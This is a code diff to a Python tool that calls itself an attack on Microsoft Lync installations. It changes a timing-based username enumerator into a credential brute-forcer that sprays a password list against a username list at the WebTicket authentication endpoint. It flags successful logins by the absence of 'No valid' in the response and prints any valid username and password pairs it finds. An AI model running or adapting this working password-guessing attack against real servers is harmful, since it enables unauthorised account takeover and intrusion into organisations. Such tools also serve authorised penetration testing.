@@ -11,6 +11,8 @@ try:
 except:
         pass
 
+validCred = False
+
 
 def main():
         parser = argparse.ArgumentParser(description='Attack Microsoft Lync installations')
@@ -44,15 +46,22 @@ def main():
                         if timeout:
                                 print_status("Average timeout is: {0}".format(timeout))
 
-                                with open(os.path.abspath(args.usernames)) as user_file:
-                                        for user in user_file:
-                                                response_time = send_xml(args.host, args.domain, user.rstrip(),args.passwd)
-                                                print_status("Time for {0}: {1}".format(user.rstrip(), response_time))
-                                                candidatevalue=float(float(response_time)/timeout)
-						if candidatevalue <= float("0.4"):
-                                                        print_good("FOUND VALID USERNAME {0}".format(user.rstrip()))
-
+                                with open(args.passwd) as pass_file:
+                                        for password in pass_file:
+                                                with open(os.path.abspath(args.usernames)) as user_file:
+                                                        for user in user_file:
+                                                            response_time = send_xml(args.host, args.domain, user.rstrip(),password.rstrip())
+                                                            print_status("Testing Credentials {0}:{1}".format(user.rstrip(), password.rstrip()))
+                                                            print_status("Time for {0}: {1}".format(user.rstrip(), response_time))
+                                                            candidatevalue=float(float(response_time)/timeout)
+                                                            if candidatevalue <= float("0.4"):
+                                                                    if validCred:
+                                                                        print_good("VALID CREDENTIALS: {0}:{1}".format(user.rstrip(), password.rstrip()))
+                                                                    else:
+                                                                        print_good("Valid User, Invalid Password: {0}".format(user.rstrip()))
+                                                            print ''
                                 user_file.close()
+                                pass_file.close()
                 else:
                         print_error('Could not find username file')
 
@@ -138,6 +147,7 @@ def baseline_timeout(host, domain):
 
 # Send Lync request
 def send_xml(host, domain, user, passwd):
+        global validCred
         domain_user = "{0}\\{1}".format(domain, user)
         encoded_username = base64.b64encode(domain_user.encode('ascii'))
         encoded_password = base64.b64encode(passwd.encode('ascii'))
@@ -150,6 +160,10 @@ def send_xml(host, domain, user, passwd):
                 #print xml_data
                 lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
                 webholder = requests.post(lync_url, headers=headers, data=xml_data, verify=False)
+                if 'No valid' in webholder.text:
+                    validCred = False
+                else:
+                    validCred = True
                 response_time = str(webholder.elapsed.total_seconds())
                 status_code = webholder.status_code
                 #print "Received status code " + str(status_code)
